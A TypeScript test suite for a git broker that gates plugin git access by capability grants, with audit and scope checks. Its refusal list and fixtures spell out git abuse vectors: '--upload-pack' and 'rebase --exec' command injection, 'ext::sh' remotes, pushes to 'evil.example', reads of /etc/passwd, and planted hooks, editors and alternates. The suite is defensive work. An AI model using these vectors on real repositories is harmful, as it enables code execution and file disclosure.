/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

/**
 * The git broker (spec I.5, INV-16): HostGit for plugins behind the principal and its capabilities.
 * Real repositories, real git, a fake HOME. GIT-1..4 through the broker; GIT-BROKER-1 (capabilities),
 * GIT-BROKER-2 (arguments), GIT-BROKER-3 (a push to an unexpected remote), GIT-BROKER-4 (no editor,
 * hook or config program runs), and the adversarial cases (forged principal, repository outside the
 * scope, a chain whose caller may not).
 */

import assert from 'assert';
import { execFileSync } from 'child_process';
import { promises as fs } from 'fs';
import { tmpdir } from 'os';
import { DisposableStore } from '../../../../base/common/lifecycle.js';
import { join } from '../../../../base/common/path.js';
import { isWindows } from '../../../../base/common/platform.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { ICallContext, IPrincipal, SubjectKey } from '../../../voltSandbox/common/principals.js';
import { BrokerHost, grant, outcome } from '../../../voltSandbox/test/node/brokerFixture.js';
import { gitBrokerCommand, gitRemoteTarget } from '../../common/gitBroker.js';
import { BuildEntryGuard } from '../../node/buildEntryGuard.js';
import { GitBroker, IGitScope } from '../../node/gitBroker.js';

const READER: SubjectKey = 'plugin:acme.history@local';
const WRITER: SubjectKey = 'plugin:acme.committer@local';
const PUSHER: SubjectKey = 'plugin:acme.shipper@local';

(isWindows ? suite.skip : suite)('Volt git broker (I.5)', function () {

	this.timeout(60_000);
	const disposables = ensureNoDisposablesAreLeakedInTestSuite();

	let root: string;
	let ws: string;
	let home: string;
	let guard: BuildEntryGuard;
	let baseEnv: Record<string, string>;
	let store: DisposableStore;
	let host: BrokerHost;
	let broker: GitBroker;

	function plain(cwd: string, ...args: string[]): string {
		return execFileSync('git', args, { cwd, env: { ...baseEnv, GIT_CONFIG_NOSYSTEM: '1' }, encoding: 'utf8', stdio: 'pipe' });
	}

	async function repo(dir: string, bare = false): Promise<string> {
		await fs.mkdir(dir, { recursive: true });
		if (bare) {
			plain(dir, 'init', '-q', '--bare');
			return dir;
		}
		plain(dir, 'init', '-q', '-b', 'main');
		plain(dir, 'config', 'user.name', 't');
		plain(dir, 'config', 'user.email', 't@t');
		await fs.writeFile(join(dir, 'a.txt'), 'a\n');
		plain(dir, '-c', 'core.hooksPath=/dev/null', 'add', 'a.txt');
		plain(dir, '-c', 'core.hooksPath=/dev/null', 'commit', '-qm', 'init');
		return dir;
	}

	async function trap(path: string, marker: string): Promise<void> {
		await fs.writeFile(path, `#!/bin/sh\ntouch '${marker}'\nexit 0\n`, { mode: 0o755 });
	}

	const exists = (path: string) => fs.lstat(path).then(() => true, () => false);

	function scope(principal: IPrincipal): IGitScope | undefined {
		return principal.subject.startsWith('plugin:') ? { roots: [ws], platform: process.platform } : undefined;
	}

	setup(async () => {
		root = await fs.realpath(await fs.mkdtemp(join(tmpdir(), 'volt-git-broker-')));
		ws = join(root, 'ws');
		home = join(root, 'home');
		await fs.mkdir(home, { recursive: true });
		await fs.mkdir(ws);
		guard = new BuildEntryGuard(join(root, 'trust'), home);
		baseEnv = { PATH: process.env.PATH ?? '/usr/bin:/bin', HOME: home, XDG_CONFIG_HOME: join(home, '.config'), LANG: 'C' };
		store = disposables.add(new DisposableStore());
		host = new BrokerHost(store, {
			manifests: [
				{ subject: READER, declared: [{ id: 'git.read' }], network: 'none' },
				{ subject: WRITER, declared: [{ id: 'git.read' }, { id: 'git.write' }], network: 'none' },
				{ subject: PUSHER, declared: [{ id: 'git.read' }, { id: 'git.write' }, { id: 'git.push' }], network: 'broker' },
			],
			grants: [grant(READER, 'git.read'), grant(WRITER, 'git.read'), grant(WRITER, 'git.write'), grant(PUSHER, 'git.read'), grant(PUSHER, 'git.write'), grant(PUSHER, 'git.push', { scope: { targets: [`file:${join(root, 'ws', 'origin.git')}`] } })],
		});
		broker = new GitBroker({ authority: host.authority, callers: host.registry, audit: host.audit, scope, hostGit: { baseEnv }, guard });
	});

	teardown(() => fs.rm(root, { recursive: true, force: true }));

	test('GIT-BROKER-1: git.read reads; git.write and git.push need their own grants; every call is audited', async () => {
		const dir = await repo(join(ws, 'app'));
		const reader = host.connect(READER);
		const status = await broker.run(reader.context, { repo: dir, args: ['status', '--porcelain'] });
		assert.strictEqual(status.exitCode, 0, status.stderr);
		const log = await broker.run(reader.context, { repo: dir, args: ['log', '--format=%s'] });
		assert.strictEqual(log.stdout.trim(), 'init');
		assert.strictEqual((await broker.run(reader.context, { repo: dir, args: ['branch', '--show-current'] })).stdout.trim(), 'main');
		for (const args of [['commit', '--allow-empty', '-m', 'x'], ['branch', 'new'], ['tag', 'v1'], ['checkout', '-b', 'y'], ['push', 'origin']]) {
			assert.strictEqual(await outcome(broker.run(reader.context, { repo: dir, args })), args[0] === 'push' ? 'invalid' : 'denied', args.join(' '));
		}
		assert.strictEqual(plain(dir, 'branch', '--list').trim(), '* main', 'nothing was created');

		const writer = host.connect(WRITER);
		const commit = await broker.run(writer.context, { repo: dir, args: ['commit', '--allow-empty', '-m', 'from a plugin'] });
		assert.strictEqual(commit.exitCode, 0, commit.stderr);
		assert.strictEqual(plain(dir, 'log', '-1', '--format=%s').trim(), 'from a plugin');

		const events = host.audit.events.map(event => `${event.method}:${event.decision}`);
		assert.ok(events.includes('run:status:allow') && events.includes('run:commit:deny') && events.includes('run:commit:allow'), events.join(' '));
		assert.ok(host.audit.events.every(event => event.epoch === 1));
	});

	test('GIT-BROKER-2: global options, config overrides, program-running and file-reaching options are refused before git runs', () => {
		const refused = [
			['-c', 'core.fsmonitor=/tmp/x', 'status'], ['-C', '/', 'status'], ['--git-dir=/tmp', 'status'], ['--exec-path=/tmp', 'status'], ['--config-env=core.hooksPath=X', 'status'],
			['config', 'core.hooksPath', 'x'], ['remote', 'add', 'evil', 'https://evil.example/x'], ['submodule', 'update'], ['clone', 'https://x/y'], ['difftool'], ['my-alias'],
			['fetch', '--upload-pack=touch /tmp/p', 'origin'], ['fetch', '--upload-p=x', 'origin'], ['push', '--receive-pack=x', 'origin'], ['push', '--exec=x', 'origin'], ['push', '--repo=https://evil.example/x'],
			['push', 'https://evil.example/x.git'], ['push', '/tmp/elsewhere.git'], ['push', 'git@evil.example:x/y.git'], ['push'],
			['diff', '--no-index', '/etc/passwd', '/dev/null'], ['diff', '--output=/tmp/x'], ['log', '--ext-diff'], ['show', '--textconv'], ['log', '--show-signature'],
			['blame', '--contents', '/etc/passwd', 'a.txt'], ['grep', '-O', 'x'], ['grep', '--open-files-in-pager=sh', 'x'], ['grep', '-f', '/etc/passwd'],
			['commit', '-F', '/etc/passwd'], ['commit', '--file=/etc/passwd'], ['commit', '--template=/etc/passwd'], ['commit', '-e', '-m', 'x'], ['commit', '-am', 'x', '-S'],
			['rebase', '-x', 'touch /tmp/p', 'main'], ['rebase', '--exec=touch /tmp/p', 'main'], ['rebase', '-i', 'main'], ['merge', '-s', 'evil', 'x'], ['add', '-p'], ['add', '--interactive'],
			['checkout', '--pathspec-from-file=/etc/passwd'], ['ls-files', '--exclude-from=/etc/passwd'], ['status', 'a\0b'],
		];
		for (const args of refused) {
			assert.throws(() => gitBrokerCommand(args), JSON.stringify(args));
		}
		assert.deepStrictEqual(gitBrokerCommand(['diff', 'HEAD']).args, ['diff', '--no-ext-diff', '--no-textconv', 'HEAD']);
		assert.strictEqual(gitBrokerCommand(['switch', '-c', 'feature']).capability, 'git.write');
		assert.strictEqual(gitBrokerCommand(['ls-files', '--exclude=*.o', '-o']).capability, 'git.read');
		assert.strictEqual(gitBrokerCommand(['tag', '--list']).capability, 'git.read');
		assert.strictEqual(gitBrokerCommand(['tag', '-d', 'v1']).capability, 'git.write');
		assert.strictEqual(gitBrokerCommand(['branch', '-D', 'x']).capability, 'git.write');
		assert.strictEqual(gitBrokerCommand(['push', 'origin', 'main']).remote, 'origin');
		assert.deepStrictEqual(gitRemoteTarget('git@github.com:Acme/App.git'), { target: 'github.com/Acme/App' });
		assert.deepStrictEqual(gitRemoteTarget('https://tok@GitHub.com/acme/app.git'), { target: 'github.com/acme/app' });
		assert.strictEqual(gitRemoteTarget('ext::sh -c touch% /tmp/p'), undefined);
		assert.strictEqual(gitRemoteTarget('fd::3'), undefined);
	});

	test('GIT-BROKER-3: a push goes only to the remote its grant names; a remote outside the scope or over another transport is refused', async () => {
		const dir = await repo(join(ws, 'app'));
		const origin = await repo(join(ws, 'origin.git'), true);
		const evil = await repo(join(ws, 'evil.git'), true);
		const outside = await repo(join(root, 'outside.git'), true);
		plain(dir, 'remote', 'add', 'origin', origin);
		plain(dir, 'remote', 'add', 'evil', evil);
		plain(dir, 'remote', 'add', 'outside', outside);
		plain(dir, 'remote', 'add', 'ext', 'ext::sh -c touch% /tmp/volt-git-broker-ext');
		plain(dir, 'remote', 'add', 'mixed', origin);
		plain(dir, 'remote', 'set-url', '--add', '--push', 'mixed', origin);
		plain(dir, 'remote', 'set-url', '--add', '--push', 'mixed', evil);
		const { context } = host.connect(PUSHER);

		const pushed = await broker.run(context, { repo: dir, args: ['push', 'origin', 'main'] });
		assert.strictEqual(pushed.exitCode, 0, pushed.stderr);
		assert.ok(plain(origin, 'branch', '--list').includes('main'));

		assert.strictEqual(await outcome(broker.run(context, { repo: dir, args: ['push', 'evil', 'main'] })), 'denied', 'a remote the grant does not name');
		assert.strictEqual(await outcome(broker.run(context, { repo: dir, args: ['push', 'outside', 'main'] })), 'denied', 'a local repository outside the scope');
		assert.strictEqual(await outcome(broker.run(context, { repo: dir, args: ['push', 'ext', 'main'] })), 'denied', 'ext:: never runs');
		assert.strictEqual(await outcome(broker.run(context, { repo: dir, args: ['push', 'mixed', 'main'] })), 'denied', 'one of its push URLs is another repository');
		assert.strictEqual(await outcome(broker.run(context, { repo: dir, args: ['push', 'nosuch', 'main'] })), 'invalid');
		assert.strictEqual(await outcome(broker.run(context, { repo: dir, args: ['push', evil, 'main'] })), 'invalid', 'a path is never a remote');
		assert.ok(!plain(evil, 'branch', '--list').includes('main'));
		assert.ok(!plain(outside, 'branch', '--list').includes('main'));
		assert.ok(!await exists('/tmp/volt-git-broker-ext'));
	});

	test('GIT-1/GIT-4 through the broker: a planted commondir or alternates is refused, and nothing it names runs', async () => {
		const dir = await repo(join(ws, 'app'));
		const marker = join(root, 'marker-1');
		const evil = join(root, 'evil-common');
		await fs.cp(join(dir, '.git'), evil, { recursive: true });
		await trap(join(root, 'fsmon.sh'), marker);
		await fs.appendFile(join(evil, 'config'), `[core]\n\tfsmonitor = ${join(root, 'fsmon.sh')}\n`);
		await fs.writeFile(join(dir, '.git', 'commondir'), `${evil}\n`);
		const { context } = host.connect(READER);
		assert.strictEqual(await outcome(broker.run(context, { repo: dir, args: ['status'] })), 'denied');
		assert.ok(!await exists(marker));
		await fs.rm(join(dir, '.git', 'commondir'));

		const other = await repo(join(ws, 'private'));
		await fs.writeFile(join(other, 'secret.txt'), 'CANARY-PRIVATE\n');
		const blob = plain(other, 'hash-object', '-w', 'secret.txt').trim();
		await guard.snapshot(dir);
		await fs.writeFile(join(dir, '.git', 'objects', 'info', 'alternates'), `${join(other, '.git', 'objects')}\n`);
		assert.strictEqual(await outcome(broker.run(context, { repo: dir, args: ['cat-file', '-p', blob] })), 'denied');
	});

	test('GIT-2/GIT-3/GIT-BROKER-4: no fsmonitor, hook, editor or config program runs for a plugin; unreviewed git config stops it', async () => {
		const dir = await repo(join(ws, 'app'));
		const marker = join(root, 'marker');
		for (const name of ['fsmon.sh', 'editor.sh', 'hook.sh']) {
			await trap(join(root, name), marker);
		}
		plain(dir, 'config', 'core.fsmonitor', join(root, 'fsmon.sh'));
		plain(dir, 'config', 'core.editor', join(root, 'editor.sh'));
		plain(dir, 'config', 'sequence.editor', join(root, 'editor.sh'));
		await fs.mkdir(join(dir, 'tools', 'hooks'), { recursive: true });
		await trap(join(dir, 'tools', 'hooks', 'pre-commit'), marker);
		await trap(join(dir, 'tools', 'hooks', 'commit-msg'), marker);
		plain(dir, 'config', 'core.hooksPath', 'tools/hooks');
		const { context } = host.connect(WRITER);
		for (const args of [['status'], ['commit', '--allow-empty', '-m', 'm'], ['commit', '--allow-empty'], ['checkout', '-q', '-b', 'other'], ['merge', '--no-ff', 'main']]) {
			await broker.run(context, { repo: dir, args });
			assert.ok(!await exists(marker), `${args.join(' ')} ran a program the repository names`);
		}
		// Proof the traps are live: plain git runs the repository's editor and hooks.
		try {
			plain(dir, 'commit', '--allow-empty');
		} catch {
			// The trap editor leaves the message empty: the commit aborts after running it.
		}
		assert.ok(await exists(marker), 'proof: plain git commit runs the configured editor or hook');
		await fs.rm(marker);

		// The plugin's write recorded a baseline; a later change to git config waits for the user.
		await fs.appendFile(join(dir, '.git', 'config'), '[alias]\n\tx = status\n');
		assert.strictEqual(await outcome(broker.run(context, { repo: dir, args: ['status'] })), 'denied');
		await guard.accept(dir);
		assert.strictEqual(await outcome(broker.run(context, { repo: dir, args: ['status'] })), 'ok');
	});

	test('adversarial: a forged principal, a repository outside the scope or not a work tree top, and a chain whose caller may not', async () => {
		const dir = await repo(join(ws, 'app'));
		const outside = await repo(join(root, 'outside'));
		const reader = host.connect(READER);
		const forged: ICallContext = { principal: { ...reader.principal }, onBehalfOf: [], requestId: 'forged' };
		assert.strictEqual(await outcome(broker.run(forged, { repo: dir, args: ['status'] })), 'unauthenticated');
		assert.strictEqual(await outcome(broker.run(reader.context, { repo: outside, args: ['status'] })), 'denied');
		await fs.symlink(outside, join(ws, 'link'));
		assert.strictEqual(await outcome(broker.run(reader.context, { repo: join(ws, 'link'), args: ['status'] })), 'denied', 'a symlink out of the scope');
		await fs.mkdir(join(dir, 'sub'));
		assert.strictEqual(await outcome(broker.run(reader.context, { repo: join(dir, 'sub'), args: ['status'] })), 'invalid');
		assert.strictEqual(await outcome(broker.run(reader.context, { repo: 'relative', args: ['status'] })), 'invalid');
		// A writer acting for a reader: the reader has no git.write, so the commit is refused.
		const writer = host.connect(WRITER);
		const routed = host.registry.route(reader.context, writer.channel, 'routed')!;
		assert.strictEqual(await outcome(broker.run(routed, { repo: dir, args: ['commit', '--allow-empty', '-m', 'x'] })), 'denied');
		assert.deepStrictEqual(host.audit.events.at(-1)?.chain, [READER]);
		// Revoked: its grant is gone, so the next call is refused.
		host.update({ grants: host.grants.filter(g => g.subject !== WRITER) });
		assert.strictEqual(await outcome(broker.run(writer.context, { repo: dir, args: ['commit', '--allow-empty', '-m', 'x'] })), 'denied');
	});
});
